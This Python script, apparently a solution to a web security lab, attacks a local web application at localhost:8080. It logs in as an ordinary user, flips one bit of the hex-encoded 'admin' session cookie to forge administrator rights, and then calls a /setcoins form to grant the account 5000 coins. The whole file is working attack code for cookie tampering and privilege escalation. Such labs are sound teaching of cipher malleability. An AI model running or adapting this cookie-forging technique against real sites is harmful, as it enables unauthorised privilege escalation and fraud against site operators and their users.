from requests import codes, Session
from binascii import unhexlify, hexlify

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok

def edit_cookie(cookie):
    cookie_bytes = unhexlify(cookie)
    modified_byte = cookie_bytes[0] ^ 0x01
    modified_cookie_bytes = bytes([modified_byte]) + cookie_bytes[1:]
    modified_cookie = hexlify(modified_cookie_bytes).decode('utf-8')
    return modified_cookie
	
def do_attack():
	print("Starting attack")
	sess = Session()
  	#you'll need to change this to a non-admin user, such as 'victim'.
	uname ="henry"
	pw = "bao"
	print("Logging in as " + uname)
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here
	original_cookie = sess.cookies.get('admin')
	modified_cookie = edit_cookie(original_cookie)

	print(sess.cookies)
	print("OG cookie: " + original_cookie)
	print("Modified cookie: " + modified_cookie)
	
	for cookie in sess.cookies:
		if cookie.name == 'admin':
			sess.cookies.pop(cookie.name, None)
	sess.cookies['admin'] = modified_cookie

	print("newly set cookie: " + sess.cookies.get('admin'))

	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
